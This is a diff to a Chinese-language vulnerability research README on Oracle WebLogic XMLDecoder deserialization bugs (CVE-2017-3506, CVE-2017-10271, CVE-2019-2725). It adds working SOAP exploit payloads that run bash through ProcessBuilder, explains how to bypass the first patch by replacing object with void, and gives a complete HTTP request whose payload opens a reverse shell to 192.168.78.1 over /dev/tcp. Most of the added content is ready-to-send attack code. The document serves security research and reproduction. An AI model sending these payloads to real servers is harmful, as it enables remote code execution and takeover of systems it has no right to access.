@@ -85,7 +85,7 @@ IDEA
 
 
 
-## CVE-2017-10271 Weblogic XMLDecoder反序化
+## CVE-2017-3506 Weblogic XMLDecoder反序化
 
 
 
@@ -123,7 +123,30 @@ processRequest:43, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
 
 packet类在`middleware/modules/glassfish.jaxws.rt_1.3.0.0_2-1-5.jar!/com/sun/xml/ws/api/message/Packet.class`处定义，调用var1的getMessage方法得到message的内容，再调用getHeaders获取到header内容，因此var2里放的就是header的内容。
 
-var2是HeaderList对象，在`middleware/modules/glassfish.jaxws.rt_1.3.0.0_2-1-5.jar!/com/sun/xml/ws/api/message/HeaderList.class`中定义，调用其get方法
+```
+<soapenv:Header>
+<work:WorkContextxmlns:work="http://bea.com/2004/06/soap/workarea/">
+<java>
+<void class="java.lang.ProcessBuilder">
+<array class="java.lang.String" length="3">
+<void index="0">
+<string>bash</string>
+</void>
+<void index="1">
+<string>-c</string>
+</void>
+<void index="2">
+<string>touch /tmp/success</string>
+</void>
+</array>
+<void method="start"/>
+</void>
+</java>
+</work:WorkContext>
+</soapenv:Header>
+```
+
+var2是HeaderList对象，HeaderList类在`middleware/modules/glassfish.jaxws.rt_1.3.0.0_2-1-5.jar!/com/sun/xml/ws/api/message/HeaderList.class`中定义，调用其get方法
 
 ![image-20191110214652156](README.assets/image-20191110214652156.png)
 
@@ -134,8 +157,23 @@ var2是HeaderList对象，在`middleware/modules/glassfish.jaxws.rt_1.3.0.0_2-1-
 也就是发送的SOAP内容中的部分
 
 ```
-<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
-…………
+<work:WorkContextxmlns:work="http://bea.com/2004/06/soap/workarea/">
+<java>
+<void class="java.lang.ProcessBuilder">
+<array class="java.lang.String" length="3">
+<void index="0">
+<string>bash</string>
+</void>
+<void index="1">
+<string>-c</string>
+</void>
+<void index="2">
+<string>touch /tmp/success</string>
+</void>
+</array>
+<void method="start"/>
+</void>
+</java>
 </work:WorkContext>
 ```
 
@@ -176,3 +214,148 @@ poc中的payload如下
 成功
 
 ![image-20191110215849863](README.assets/image-20191110215849863.png)
+
+
+
+
+
+### 补丁分析
+
+
+
+```
+private void validate(InputStream is) {
+WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
+try {
+SAXParser parser = factory.newSAXParser();
+parser.parse(is, new DefaultHandler() {
+public void startElement(String uri, String localName, String qName,Attributes attributes) throws SAXException {
+if(qName.equalsIgnoreCase(“object”)){
+throw newIllegalStateException(“Invalid context type: object”);
+}
+}
+});
+} catch (ParserConfigurationException var5) {
+throw new IllegalStateException(“Parser Exception”, var5);
+} catch (SAXException var6) {
+throw new IllegalStateException(“Parser Exception”, var6);
+} catch (IOException var7) {
+throw new IllegalStateException(“Parser Exception”, var7);
+}
+}
+```
+
+在对xml的解析过程中，如果qName的值是Object时将会抛出异常也就是，该补丁只是简单的检查了XML中是否包含了`<object>`节点，然后将`<object>`换为`<void>`即可绕过此补丁 
+
+
+
+
+
+## CVE-2017-10271 Weblogic XMLDecoder反序化
+
+
+
+### 漏洞分析
+
+> 漏洞触发位置：wls-wsat.war
+>
+> 漏洞触发URL：/wls-wsat/CoordinatorPortType（POST）
+>
+> 漏洞原因综述：在CVE-2017-3506的时候，官方只是简单的做了个黑名单校验，判断xml中是否有object对象，只需要换成void对象就又可以触发漏洞
+
+
+
+
+
+### 漏洞复现
+
+
+
+```
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+      <java>
+        <void class="java.lang.ProcessBuilder">
+          <array class="java.lang.String" length="3">
+            <void index="0">
+              <string>/bin/bash</string>
+            </void>
+            <void index="1">
+              <string>-c</string>
+            </void>
+            <void index="2">
+              <string>touch /tmp/Mote22</string>
+            </void>
+          </array>
+        <void method="start"/></void>
+      </java>
+    </work:WorkContext>
+  </soapenv:Header>
+  <soapenv:Body/>
+</soapenv:Envelope>
+```
+
+可以看到把object对象换成了void对象，其余不变
+
+![image-20191111103125001](README.assets/image-20191111103125001.png)
+
+
+
+![image-20191111103140510](README.assets/image-20191111103140510.png)
+
+
+
+
+
+对于wls-wsat.war包的入口，如果/wls-wsat/CoordinatorPortType不行，可以尝试换别的接口
+
+接口定义在`middleware/wlserver/server/lib/wls-wsat.war!/WEB-INF/web.xml`
+
+
+
+### CVE-2019-2725
+
+
+
+
+
+
+
+
+
+```
+POST /_async/AsyncResponseService HTTP/1.1
+Host: 192.168.78.163:7001
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
+SOAPAction: ""
+Content-Type: text/xml;charset=UTF-8
+fileName: 123.jsp
+Content-Length: 785
+Connection: close
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
+<soapenv:Header> 
+<wsa:Action>xx</wsa:Action>
+<wsa:RelatesTo>xx</wsa:RelatesTo>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<void class="java.lang.ProcessBuilder">
+<array class="java.lang.String" length="3">
+<void index="0">
+<string>/bin/bash</string>
+</void>
+<void index="1">
+<string>-c</string>
+</void>
+<void index="2">
+<string>bash -i &gt;&amp; /dev/tcp/192.168.78.1/81 0&gt;&amp;1</string>
+</void>
+</array>
+<void method="start"/></void>
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body>
+<asy:onAsyncDelivery/>
+</soapenv:Body></soapenv:Envelope>
+```
+
